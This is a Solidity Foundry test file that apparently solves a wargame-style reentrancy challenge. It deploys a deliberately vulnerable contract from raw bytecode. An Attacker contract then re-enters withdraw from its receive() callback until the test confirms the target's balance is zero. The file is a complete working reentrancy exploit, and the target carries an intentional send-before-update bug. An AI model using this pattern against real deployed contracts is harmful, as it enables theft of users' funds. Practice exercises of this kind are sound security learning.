// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface IReentrance {
    function balanceOf(address _who) external view returns (uint256 balance);

    function balances(address) external view returns (uint256);

    function donate(address _to) external payable;

    function withdraw(uint256 _amount) external;
}

contract Attacker {
    IReentrance public reentrance;

    constructor(IReentrance reentrance_) {
        reentrance = reentrance_;
    }

    function attack() external payable {
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(msg.value);
    }

    receive() external payable {
        reentrance.withdraw(reentrance.balanceOf(address(this)));
    }
}

contract ReentranceTest is Test {
    IReentrance internal _reentrance;

    function setUp() public {
        _reentrance = _deployContract();
        payable(address(_reentrance)).transfer(0.001e18);
    }

    function test_attack() public {
        Attacker attacker = new Attacker(_reentrance);

        attacker.attack{value: address(_reentrance).balance}();

        assertEq(address(_reentrance).balance, 0, "balance");
    }

    function _deployContract() internal returns (IReentrance) {
        bytes memory code = hex"608060405234801561001057600080fd5b50610296806100206000396000f3fe6080604052600436106100425760003560e01c8062362a951461004e57806327e235e3146100765780632e1a7d4d146100bb57806370a08231146100e557610049565b3661004957005b600080fd5b6100746004803603602081101561006457600080fd5b50356001600160a01b0316610118565b005b34801561008257600080fd5b506100a96004803603602081101561009957600080fd5b50356001600160a01b0316610157565b60408051918252519081900360200190f35b3480156100c757600080fd5b50610074600480360360208110156100de57600080fd5b5035610169565b3480156100f157600080fd5b506100a96004803603602081101561010857600080fd5b50356001600160a01b03166101e4565b6001600160a01b03811660009081526020819052604090205461013b90346101ff565b6001600160a01b03909116600090815260208190526040902055565b60006020819052908152604090205481565b3360009081526020819052604090205481116101e157604051600090339083908381818185875af1925050503d80600081146101c1576040519150601f19603f3d011682016040523d82523d6000602084013e6101c6565b606091505b50503360009081526020819052604090208054849003905550505b50565b6001600160a01b031660009081526020819052604090205490565b600082820183811015610259576040805162461bcd60e51b815260206004820152601b60248201527f536166654d6174683a206164646974696f6e206f766572666c6f770000000000604482015290519081900360640190fd5b939250505056fea2646970667358221220eb5c6c8b93b98bdc8117b0d527db713537a027a9ab2d0179b4af80774a7b96a464736f6c634300060c0033";
        address addr;

        assembly {
            addr := create(0, add(code, 32), mload(code))
        }

        return IReentrance(addr);
    }
}